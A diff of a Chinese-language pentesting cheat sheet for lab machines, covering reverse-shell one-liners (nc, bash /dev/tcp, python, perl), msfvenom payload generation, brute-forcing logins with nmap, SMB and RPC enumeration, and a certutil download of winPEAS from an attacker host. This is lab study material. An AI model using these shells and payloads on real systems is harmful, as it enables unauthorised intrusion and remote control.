@@ -12,27 +12,6 @@ is_long: true
 > 本文章持续更新中 
 ## 遇见的情况以及方法论
 
-### 开放的非常规端口
-
-遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
-
-```bash
-┌──(kali㉿kali)-[~/Work/Kali]
-└─$ nc -u 10.10.10.45 1440
-?
-
-Wrong Code!!
-We'll notify Commander Tarkin of this offense
-```
-
-使用 echo 传输字符串并通过 nc 链接端口。
-
-```bash
-┌──(kali㉿kali)-[~/Work/Kali]
-└─$ echo "DS-1@OBS" | nc -u 10.10.10.45 1440
-......
-```
-
 ### 图片分析
 
 图片分析一般先查看隐写情况。
@@ -73,15 +52,15 @@ script 时 Linux 系统自带的命令，用于记录终端会话。正常使用
 nc -e /bin/bash 10.10.10.5 4444
 ```
 
-```
+```bash
 bash -c "/bin/bash -i >& /dev/tcp/10.10.10.5/4444 0>&1"
 ```
 
-```
+```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 ```
 
-```
+```bash
 perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
@@ -89,17 +68,17 @@ perl -e 'use Socket;$i="10.10.10.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprot
 
 Msf 生成反弹 shell
 
-```
+```bash
 sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
 ```
 
 生成二进制脚本
 
-```
+```bash
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c
 ```
 
-```
+```bash
 sudo msfvenom -p linux/x86/exec CMD="/bin/bash" -b "\x00" -e x86/shikata_ga_nai -f c
 ```
 
@@ -234,6 +213,31 @@ sudo ffuf -H "Host: FUZZ.soulmate.htb" -u http://soulmate.htb -w /usr/share/secl
 - Host: FUZZ.soulmate.htb：设置 `Host` 头部
 - FUZZ：`ffuf` 的关键占位符
 - -ac：自动校准模式
+
+#### 登入认证破解
+
+##### Nmap
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ sudo nmap -p80 --script=http-brute 10.129.5.91  
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-28 08:11 EST
+Stats: 0:08:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Stats: 0:08:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 0.00% done
+Nmap scan report for 10.129.5.91
+Host is up (0.095s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-brute: 
+|   Accounts: 
+|     admin:admin - Valid credentials
+|_  Statistics: Performed 45009 guesses in 535 seconds, average tps: 84.6
+
+Nmap done: 1 IP address (1 host up) scanned in 535.72 seconds
+```
 
 #### 暴力破解
 
@@ -377,6 +381,17 @@ sudo smbclient -N -L \\\\10.10.10.10
 sudo smbclient \\\\10.10.10.10\\enil
 ```
 
+####  NXC
+
+使用 nxc 进行 SMB 共享枚举，尝试使用空密码进行匿名登入。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ nxc smb driver.htb --shares -u enil -p ''
+SMB         10.129.5.91     445    DRIVER           [*] Windows 10 Build 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True) 
+SMB         10.129.5.91     445    DRIVER           [-] DRIVER\enil: STATUS_LOGON_FAILURE
+```
+
 ### 缓冲区溢出
 
 #### Msf
@@ -403,3 +418,72 @@ msf-nasm_shell
 jmp esp
 ```
 
+### 嗅探
+
+#### Responder
+
+### 命令行解密
+
+#### base64
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ echo "NURHR1EtUExWNDEtSFk4MUYtR0dOM0Y=" | base64 -d
+5DGGQ-PLV41-HY81F-GGN3F
+```
+
+### 135 RCP
+
+连接 135 rcp 端口。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ rpcclient -U '' -N 10.129.5.91
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+```
+
+- -U 指定用户名参数，使用空字符串表示匿名用户
+- -N 表示不使用密码进行认证
+
+### Nc
+
+遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ nc -u 10.10.10.45 1440
+?
+
+Wrong Code!!
+We'll notify Commander Tarkin of this offense
+```
+
+使用 echo 传输字符串并通过 nc 链接端口。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ echo "DS-1@OBS" | nc -u 10.10.10.45 1440
+......
+```
+
+### 加密识别
+
+#### Nth
+
+```
+nth --file Test
+```
+
+### 传输文件
+
+#### Windows
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps> certutil.exe -urlcache -split -f "http://10.10.16.155:8000/winPEASx64.exe" .
+****  Online  ****
+  000000  ...
+  9b3200
+
+
+CertUtil: -URLCache command completed successfully.
+```
